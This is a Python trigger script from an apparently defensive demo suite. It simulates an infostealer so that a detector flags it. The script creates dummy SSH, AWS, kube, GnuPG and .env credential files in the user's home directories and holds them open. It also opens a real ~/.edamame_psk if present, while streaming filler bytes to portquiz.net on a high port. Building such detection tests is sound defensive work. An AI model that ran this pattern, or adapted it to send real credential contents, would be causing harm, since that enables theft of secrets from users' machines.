#!/usr/bin/env python3
"""
Trigger multi-credential harvest + exfiltration detection.

Real threat: OpenClaw issue #9627 (config secret sprawl) + VirusTotal
AMOS infostealer pattern -- an agent or malicious skill accesses
multiple credential stores simultaneously before exfiltrating data.

This script opens handles to five distinct credential categories
(SSH, AWS, kube, GnuPG, .env) while streaming data to an undeclared
high-port destination.  The multi-credential pattern produces richer
sensitive-path labels than the single-file trigger_cve_token_exfil.py.

Detection path:
  flodbadd iForest  ->  session marked "anomalous" (long-lived high-port flow)
  L7 open_files contains multiple sensitive paths  ->  token_exfiltration
  sensitive-path labels: ssh + aws + kube + gnupg + env

Reference: OpenClaw #9627 (config secret sprawl), VirusTotal AMOS analysis

Cross-platform: macOS, Linux, Windows.
"""

from __future__ import annotations

import argparse
import os
import platform
import signal
import socket
import sys
import time
from pathlib import Path

STATE_DIR = Path("/tmp/edamame_claude_code_demo") if platform.system() != "Windows" \
    else Path(os.environ.get("TEMP", "C:\\Temp")) / "edamame_claude_code_demo"

PID_FILE = "credential_sprawl.pid"
CREATED_MARKER = "credential_sprawl.created"

DEFAULT_TARGET_HOST = "portquiz.net"
DEFAULT_TARGET_PORT = 54321
DEFAULT_PAYLOAD_BYTES = 4096

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger multi-credential harvest detection by holding "
                    "multiple credential files open while streaming to a high port."
    )
    p.add_argument("--target-host", default=DEFAULT_TARGET_HOST)
    p.add_argument("--target-ip", default="",
                   help="Pre-resolved IP; skips DNS if set")
    p.add_argument("--target-port", type=int, default=DEFAULT_TARGET_PORT)
    p.add_argument("--interval", type=float, default=0.2,
                   help="Seconds between outbound bursts")
    p.add_argument("--duration", type=float, default=0.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--payload-bytes", type=int, default=DEFAULT_PAYLOAD_BYTES)
    p.add_argument("--state-dir", type=Path, default=STATE_DIR)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {l.strip() for l in marker.read_text("utf-8").splitlines() if l.strip()}
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def ensure_demo_sensitive_file(path: Path, content: str, state_dir: Path) -> Path:
    path = path.expanduser()
    path.parent.mkdir(parents=True, exist_ok=True)
    if path.exists():
        return path
    path.write_text(content, encoding="utf-8")
    try:
        path.chmod(0o600)
    except OSError:
        pass
    record_created(state_dir, path)
    return path


def resolve_target(target_ip: str, target_host: str) -> str:
    if target_ip.strip():
        return target_ip.strip()
    return socket.gethostbyname(target_host)


def open_sensitive_files(paths: list[Path]) -> list[object]:
    handles = []
    for p in paths:
        if p.exists():
            h = p.open("rb")
            h.read(1)
            h.seek(0)
            handles.append(h)
    return handles


def main() -> int:
    args = parse_args()
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    ssh_key = ensure_demo_sensitive_file(
        Path("~/.ssh/demo_claude_code_sprawl_key"),
        "-----BEGIN DEMO KEY-----\nDEMO_CLAUDE_CODE_CREDENTIAL_SPRAWL\n-----END DEMO KEY-----\n",
        state_dir,
    )
    aws_cred = ensure_demo_sensitive_file(
        Path("~/.aws/demo_claude_code_credentials"),
        "[default]\naws_access_key_id = AKIADEMO_CLAUDE_CODE_SPRAWL\naws_secret_access_key = demo_claude_code_sprawl_secret\n",
        state_dir,
    )
    kube_config = ensure_demo_sensitive_file(
        Path("~/.kube/demo_claude_code_config"),
        "apiVersion: v1\nclusters:\n- cluster:\n    server: https://demo-claude-code-sprawl.example.com\n  name: demo\n",
        state_dir,
    )
    gnupg_key = ensure_demo_sensitive_file(
        Path("~/.gnupg/demo_claude_code_sprawl.key"),
        "-----BEGIN PGP PRIVATE KEY BLOCK-----\nDEMO_CLAUDE_CODE_SPRAWL_GPG\n-----END PGP PRIVATE KEY BLOCK-----\n",
        state_dir,
    )
    env_file = ensure_demo_sensitive_file(
        Path("~/.env_demo_claude_code_sprawl"),
        "SECRET_TOKEN=demo_claude_code_sprawl_value\nAPI_KEY=demo_claude_code_sprawl_api\nDB_PASSWORD=demo_claude_code_sprawl_db\n",
        state_dir,
    )

    open_paths = [ssh_key, aws_cred, kube_config, gnupg_key, env_file]
    psk_path = Path("~/.edamame_psk").expanduser()
    if psk_path.exists():
        open_paths.append(psk_path)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    payload = b"X" * max(args.payload_bytes, 256)
    target_ip = resolve_target(args.target_ip, args.target_host)
    handles = open_sensitive_files(open_paths)
    started = time.monotonic()
    duration = max(args.duration, 0.0)
    interval = max(args.interval, 0.05)

    print(f"trigger_credential_sprawl.py active  pid={os.getpid()}")
    print(f"  credential_categories=ssh,aws,kube,gnupg,env ({len(open_paths)} files)")
    for p in open_paths:
        print(f"  open_path={p}")
    print(f"  target={target_ip}:{args.target_port} host={args.target_host}")
    print("  threat=OpenClaw #9627 (config secret sprawl) + AMOS infostealer")
    print("  detection=token_exfiltration with multi-category labels")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    sock: socket.socket | None = None
    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break

            if sock is None:
                try:
                    sock = socket.create_connection(
                        (target_ip, args.target_port), timeout=10.0
                    )
                    sock.settimeout(10.0)
                except OSError:
                    time.sleep(min(interval, 1.0))
                    continue

            try:
                sock.sendall(payload)
            except OSError:
                try:
                    sock.close()
                except OSError:
                    pass
                sock = None
                time.sleep(min(interval, 0.5))
                continue

            time.sleep(interval)
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        for h in handles:
            try:
                h.close()
            except OSError:
                pass
        try:
            pid_file.unlink()
        except FileNotFoundError:
            pass

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
